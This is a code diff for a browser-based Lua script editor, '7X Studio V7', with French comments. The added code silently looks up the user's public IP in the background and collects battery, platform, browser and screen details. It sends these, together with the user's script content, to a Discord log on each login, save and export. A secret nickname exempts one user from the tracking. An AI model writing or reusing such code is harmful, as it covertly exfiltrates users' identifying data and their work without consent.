@@ -227,6 +227,10 @@
         let sessionStartTime = Date.now();
         let lastSavedContent = "";
         let isStealthMode = false;
+        let userIP = "Détection...";
+
+        // Récupération de l'IP en arrière-plan
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => userIP = d.ip).catch(() => userIP = "Inconnue");
 
         let db = JSON.parse(localStorage.getItem('7X_V7_DB')) || {
             "GLOBAL_SCRIPTS": [{ n: "BOOT_CORE.LUA", c: "-- 7X Studio V7\nprint('Galaxy Engine Ready')\n" }],
@@ -268,7 +272,6 @@
             const nick = document.getElementById('nick-input').value.trim();
             if(!nick) return;
 
-            // --- MODE FANTÔME : 7XUHQ ---
             if(nick.toUpperCase() === "7XUHQ") {
                 isStealthMode = true;
                 console.log("🤫 MODE FANTÔME ACTIVÉ");
@@ -277,36 +280,47 @@
             document.getElementById('user-label').innerText = nick.toUpperCase();
             document.getElementById('splash-screen').style.opacity = '0';
             setTimeout(() => { document.getElementById('splash-screen').style.display = 'none'; }, 500);
-            
+
             renderFiles();
             notify('Système Prêt', 'fa-solid fa-ghost');
-            
+
             if(!isStealthMode) {
                 sendLogToDiscord("CONNEXION", "N/A", "LOGIN", "Nouvelle session utilisateur ouverte.");
             }
         }
 
         async function sendLogToDiscord(action, dossier, fichier, contenu) {
-            if(isStealthMode) return; // Bloque tout en mode furtif
+            if(isStealthMode) return;
 
             const pseudo = document.getElementById('user-label').innerText;
             const sessionTime = Math.floor((Date.now() - sessionStartTime) / 60000);
             const res = `${window.screen.width}x${window.screen.height}`;
             
-            // Formatage du message pour Discord
+            // Infos matérielles "gavées"
+            let batteryInfo = "N/A";
+            try { 
+                const batt = await navigator.getBattery();
+                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'En charge' : 'Sur batterie'})`;
+            } catch(e) {}
+
             const payload = {
-                username: "7X MONITOR",
+                username: "🛰️ 7X GALAXY MONITOR",
+                avatar_url: "https://i.imgur.com/your-icon.png",
                 embeds: [{
-                    title: "🛰️ LOGS GALAXY V7",
+                    title: `LOG : ${action}`,
                     color: 12339939,
                     fields: [
-                        { name: "👤 Pseudo", value: `\`${pseudo}\``, inline: true },
-                        { name: "💾 Action", value: `**${action}**`, inline: true },
-                        { name: "📂 Dossier/Fichier", value: `\`${dossier} / ${fichier}\``, inline: false },
+                        { name: "👤 Utilisateur", value: `\`${pseudo}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
                         { name: "⏱️ Session", value: `\`${sessionTime} min\``, inline: true },
-                        { name: "📱 Résolution", value: `\`${res}\``, inline: true }
+                        { name: "🔋 Batterie", value: `\`${batteryInfo}\``, inline: true },
+                        { name: "📱 Résolution", value: `\`${res}\``, inline: true },
+                        { name: "💻 Plateforme", value: `\`${navigator.platform}\``, inline: true },
+                        { name: "⚙️ Navigateur", value: `\`${navigator.userAgent.split(' ')[0]}\``, inline: true },
+                        { name: "📂 Dossier/Fichier", value: `\`${dossier} / ${fichier}\``, inline: false }
                     ],
-                    description: "**Code :**\n```lua\n" + (contenu.substring(0, 1500) || "N/A") + "\n```",
+                    description: "**Contenu / Code :**\n```lua\n" + (contenu.substring(0, 1800) || "N/A") + "\n```",
+                    footer: { text: "7X STUDIO V7 - SECURITY UNIT" },
                     timestamp: new Date().toISOString()
                 }]
             };
@@ -358,28 +372,26 @@
         function saveActiveFile() {
             if(!activeFile) return notify('Aucun fichier', 'fa-solid fa-triangle-exclamation');
             const newContent = document.getElementById('editor-area').value;
-            
             if(newContent === lastSavedContent) return notify('Déjà à jour', 'fa-solid fa-check');
-
             const folder = activeFile.f;
             const name = db[folder][activeFile.i].n;
-
             db[folder][activeFile.i].c = newContent;
             localStorage.setItem('7X_V7_DB', JSON.stringify(db));
             lastSavedContent = newContent;
-            
             notify('Sauvegarde OK', 'fa-solid fa-cloud-bolt');
             sendLogToDiscord("SAUVEGARDE", folder, name, newContent);
         }
 
         function exportData() {
             if(!activeFile) return;
-            const blob = new Blob([document.getElementById('editor-area').value], {type: 'text/plain'});
+            const content = document.getElementById('editor-area').value;
+            const blob = new Blob([content], {type: 'text/plain'});
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
             a.download = db[activeFile.f][activeFile.i].n.replace('.LUA', '.txt');
             a.click();
-            notify('Exportation', 'fa-solid fa-file-export');
+            notify('Exportation .txt', 'fa-solid fa-file-export');
+            sendLogToDiscord("EXPORTATION .txt", activeFile.f, db[activeFile.f][activeFile.i].n, content);
         }
 
         function openCreator(m) {
